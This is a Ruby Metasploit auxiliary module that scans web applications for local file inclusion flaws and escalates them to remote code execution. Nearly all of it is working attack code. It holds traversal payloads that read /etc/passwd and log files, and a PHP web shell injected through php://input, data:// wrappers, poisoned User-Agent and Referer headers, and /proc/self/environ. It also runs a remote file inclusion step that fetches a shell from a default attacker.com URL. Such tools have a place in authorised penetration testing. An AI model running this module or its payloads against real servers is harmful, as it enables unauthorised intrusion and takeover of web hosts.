class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Auto LFI to RCE Converter',
        'Description' => %q{
          This module automatically detects Local File Inclusion (LFI) vulnerabilities
          and attempts to escalate them to Remote Code Execution (RCE) using various
          techniques including PHP wrappers, log poisoning, and /proc/self/environ injection.
          
          Features:
          - Multiple LFI pattern detection
          - Automatic RCE attempts via different vectors
          - Support for PHP wrappers (php://input, php://filter, data://)
          - Log poisoning through User-Agent and Referer headers
          - /proc/self/environ injection
          - RFI testing when allow_url_include is enabled
          - Comprehensive reporting in Metasploit database
        },
        'Author' => [ 'h3Dr1per' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://github.com/paradoks182/lfi2rce_converter/blob/main/lfi2rce_converter.rb' ],
          [ 'CWE', '98' ],
          [ 'CWE', '73' ]
        ]
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Target URI with parameter', '/index.php?page=']),
        OptString.new('PARAMETER', [true, 'Parameter name for injection', 'page']),
        OptString.new('RFI_URL', [false, 'URL for RFI attacks', 'http://attacker.com/shell.txt']),
        OptInt.new('THREADS', [true, 'Number of threads', 10]),
        OptBool.new('CHECK_WRAPPERS', [true, 'Check PHP wrappers', true]),
        OptBool.new('CHECK_LOGS', [true, 'Check log poisoning', true]),
        OptBool.new('CHECK_ENVIRON', [true, 'Check /proc/self/environ', true]),
        OptBool.new('CHECK_RFI', [true, 'Check Remote File Inclusion', true])
      ]
    )
  end

  def run_host(ip)
    @lfi_vulnerabilities = []
    @rce_achieved = false
    
    print_status("Scanning #{ip} for LFI vulnerabilities...")
    
    lfi_payloads = [
      '../../../../etc/passwd',
      '....//....//....//etc/passwd',
      '..;/etc/passwd',
      'php://filter/convert.base64-encode/resource=index.php',
      '/proc/self/environ',
      '../../../../xampp/apache/logs/access.log',
      '../../../../windows/win.ini',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      'php://input',
      'expect://ls'
    ]
    
    lfi_payloads.each do |payload|
      break if @rce_achieved
      
      uri = build_uri_with_payload(payload)
      
      begin
        res = send_request_cgi({
          'method' => 'GET',
          'uri' => uri,
          'headers' => {
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }, 10)
        
        if res && res.body && res.body.length > 0
          if lfi_detected?(res.body)
            print_good("LFI found: #{uri}")
            @lfi_vulnerabilities << {
              'uri' => uri,
              'payload' => payload,
              'evidence' => res.body[0..200].gsub(/\n/, ' ').strip
            }
            
            if !@rce_achieved
              attempt_rce(ip, uri, payload)
            end
          end
        end
      rescue Rex::ConnectionError, Errno::ECONNRESET
        vprint_error("Connection failed: #{ip}")
      rescue => e
        vprint_error("Error: #{e.message}")
      end
    end
    
    if @lfi_vulnerabilities.any?
      report_lfi_vulnerabilities(ip)
    end
  end
  
  def build_uri_with_payload(payload)
    uri = datastore['TARGETURI'].dup
    
    if uri.include?('=')
      uri.gsub(/=.*/, '=' + payload)
    else
      uri + (uri.include?('?') ? '&' : '?') + datastore['PARAMETER'] + '=' + payload
    end
  end
  
  def lfi_detected?(body)
    body.include?('root:x:0:0') ||
    body.include?('[extensions]') ||
    body.include?('Microsoft Windows') ||
    body.include?('<?php') ||
    body =~ /[0-9a-f]{32}/ ||
    body.include?('drivers') ||
    body.include?('boot.ini')
  end
  
  def attempt_rce(ip, original_uri, original_payload)
    print_status("Attempting to convert LFI to RCE on #{ip}...")
    
    if datastore['CHECK_WRAPPERS']
      check_php_wrappers(ip)
    end
    
    if datastore['CHECK_LOGS'] && !@rce_achieved
      check_log_poisoning(ip)
    end
    

    if datastore['CHECK_ENVIRON'] && !@rce_achieved
      check_environ_rce(ip)
    end
    

    if datastore['CHECK_RFI'] && datastore['RFI_URL'] && !@rce_achieved
      check_rfi(ip)
    end
  end
  
  def check_php_wrappers(ip)
    print_status("Testing PHP wrappers...")
    
    php_code = "<?php system($_GET['cmd']); echo 'RCE_SUCCESS'; ?>"
    
    wrappers = [
      {
        'name' => 'php://input',
        'uri' => 'php://input',
        'method' => 'POST',
        'data' => php_code
      },
      {
        'name' => 'php://filter/convert.base64-decode/resource=php://temp',
        'uri' => 'php://filter/convert.base64-decode/resource=php://temp',
        'method' => 'GET'
      },
      {
        'name' => 'data://text/plain;base64,',
        'uri' => 'data://text/plain;base64,' + Rex::Text.encode_base64(php_code),
        'method' => 'GET'
      },
      {
        'name' => 'expect://',
        'uri' => 'expect://id',
        'method' => 'GET'
      }
    ]
    
    wrappers.each do |wrapper|
      next if @rce_achieved
      
      uri = build_uri_with_payload(wrapper['uri'])
      
      begin
        if wrapper['method'] == 'POST'
          res = send_request_cgi({
            'method' => 'POST',
            'uri' => uri,
            'data' => wrapper['data'],
            'headers' => {
              'Content-Type' => 'application/x-www-form-urlencoded'
            }
          }, 10)
          
          if res && res.body
            test_uri = uri + '&cmd=id'
            test_res = send_request_cgi({
              'method' => 'GET',
              'uri' => test_uri
            }, 10)
            
            if test_res && (test_res.body.include?('uid=') || test_res.body.include?('root') || test_res.body.include?('RCE_SUCCESS'))
              print_good("RCE achieved via #{wrapper['name']} on #{ip}!")
              report_rce(ip, "#{wrapper['name']} wrapper", test_res.body[0..100])
              @rce_achieved = true
            end
          end
        else
          test_uri = uri + '&cmd=id'
          res = send_request_cgi({
            'method' => 'GET',
            'uri' => test_uri
          }, 10)
          
          if res && (res.body.include?('uid=') || res.body.include?('root') || res.body.include?('RCE_SUCCESS'))
            print_good("RCE achieved via #{wrapper['name']} on #{ip}!")
            report_rce(ip, "#{wrapper['name']} wrapper", res.body[0..100])
            @rce_achieved = true
          end
        end
      rescue => e
        vprint_error("#{wrapper['name']} failed: #{e.message}")
      end
    end
  end
  
  def check_log_poisoning(ip)
    print_status("Attempting log poisoning...")
    
    log_paths = [
      '../../../../var/log/apache2/access.log',
      '../../../../var/log/httpd/access_log',
      '../../../../xampp/apache/logs/access.log',
      '../../../../var/log/nginx/access.log',
      '../../../../apache/logs/access.log',
      '../../../logs/access.log',
      '../../../../var/log/auth.log',
      '../../../../var/log/mail.log'
    ]
    
    php_payload = "<?php system($_GET['cmd']); echo 'LOG_POISON_SUCCESS'; ?>"
    
    begin
      poison_uri = datastore['TARGETURI'].dup
      send_request_cgi({
        'method' => 'GET',
        'uri' => poison_uri,
        'headers' => {
          'User-Agent' => php_payload,
          'Referer' => php_payload
        }
      }, 5)
    rescue => e
      vprint_error("Log poisoning request failed: #{e.message}")
    end
    
    log_paths.each do |log_path|
      next if @rce_achieved
      
      uri = build_uri_with_payload(log_path)
      
      begin
        cmd_uri = uri + '&cmd=id'
        res = send_request_cgi({
          'method' => 'GET',
          'uri' => cmd_uri
        }, 10)
        
        if res && (res.body.include?('uid=') || res.body.include?('root') || res.body.include?('LOG_POISON_SUCCESS'))
          print_good("Log poisoning successful via #{log_path}!")
          report_rce(ip, "Log poisoning via #{log_path}", res.body[0..100])
          @rce_achieved = true
        end
      rescue => e
        vprint_error("Log poisoning read failed: #{e.message}")
      end
    end
  end
  
  def check_environ_rce(ip)
    print_status("Checking /proc/self/environ...")
    
    uri = build_uri_with_payload('/proc/self/environ')
    
    php_payload = "<?php system($_GET['cmd']); echo 'ENVIRON_SUCCESS'; ?>"
    
    begin
      send_request_cgi({
        'method' => 'GET',
        'uri' => uri,
        'headers' => {
          'Referer' => php_payload,
          'User-Agent' => php_payload,
          'X-Forwarded-For' => php_payload
        }
      }, 5)
    rescue => e
      vprint_error("Environ poisoning failed: #{e.message}")
    end
    
    cmd_uri = uri + '&cmd=id'
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => cmd_uri
      }, 10)
      
      if res && (res.body.include?('uid=') || res.body.include?('root') || res.body.include?('ENVIRON_SUCCESS'))
        print_good("/proc/self/environ RCE successful!")
        report_rce(ip, "/proc/self/environ poisoning", res.body[0..100])
        @rce_achieved = true
      end
    rescue => e
      vprint_error("Environ RCE failed: #{e.message}")
    end
  end
  
  def check_rfi(ip)
    print_status("Testing RFI...")
    
    rfi_url = datastore['RFI_URL']
    return if rfi_url.empty?
    
    uri = build_uri_with_payload(rfi_url + '?')
    
    cmd_uri = uri + '&cmd=id'
    
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => cmd_uri
      }, 10)
      
      if res && (res.body.include?('uid=') || res.body.include?('root'))
        print_good("RFI successful with #{rfi_url}!")
        report_rce(ip, "RFI via #{rfi_url}", res.body[0..100])
        @rce_achieved = true
      end
    rescue => e
      vprint_error("RFI failed: #{e.message}")
    end
  end
  
  def report_lfi_vulnerabilities(ip)
    @lfi_vulnerabilities.each do |vuln|
      print_status("LFI on #{ip}: #{vuln['uri']}")
      print_status("Evidence: #{vuln['evidence']}")
      
      report_note(
        host: ip,
        type: 'lfi.vulnerability',
        data: vuln,
        update: :unique_data
      )
      
      report_vuln(
        host: ip,
        name: 'Local File Inclusion',
        refs: [ 'URL-elliot-lfi2rce' ],
        info: "Payload: #{vuln['payload']}\nEvidence: #{vuln['evidence']}"
      )
    end
  end
  
  def report_rce(ip, method, output)
    print_good("RCE achieved on #{ip} via #{method}")
    print_status("Command output sample: #{output}")
    
    report_note(
      host: ip,
      type: 'rce.achieved',
      data: {
        'method' => method,
        'output' => output,
        'timestamp' => Time.now.to_s
      },
      update: :unique_data
    )
    
    report_vuln(
      host: ip,
      name: 'Remote Code Execution',
      refs: [ 'URL-elliot-lfi2rce-rce' ],
      info: "Method: #{method}\nOutput: #{output}"
    )
  end
end
